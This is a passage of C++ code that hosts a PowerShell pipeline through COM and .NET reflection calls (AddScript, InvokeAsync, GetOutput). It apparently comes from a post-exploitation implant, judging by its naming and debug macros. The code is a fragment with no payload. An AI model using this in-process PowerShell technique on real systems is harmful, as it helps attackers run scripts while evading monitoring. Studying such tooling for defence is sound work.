    if (!SafeArgs || Self->Oleaut32.SafeArrayGetDim(SafeArgs) != 1) {
        KhDbg("[x] SafeArray creation failed");
        return E_FAIL;
    }

    // if (VarCommands.vt != VT_DISPATCH || !VarCommands.pdispVal) {
    //     KhDbg("[x] VarCommands invalido (VT=%d)", VarCommands.vt);
    //     Self->Oleaut32.SafeArrayDestroy(SafeArgs);
    //     return E_INVALIDARG;
    // }

    this->GetMethodType( BindFlags_1, CmdCollectType, AddScriptBstr, &AddScriptMethod );
    
    HResult = AddScriptMethod->Invoke_3( VarCommands, SafeArgs, nullptr );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }   

    HResult = PipelineType->InvokeMember_3( InvokeAsyncBstr, flags, nullptr, VarPipe, nullptr, nullptr );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }   

    HResult = PipelineType->InvokeMember_3( GetOutBstr, flags, nullptr, VarPipe, nullptr, &VarOutput );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }   

    HResult = Automation->GetType_2( PipelineHdrBstr, &PipelineHdrType );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }   
}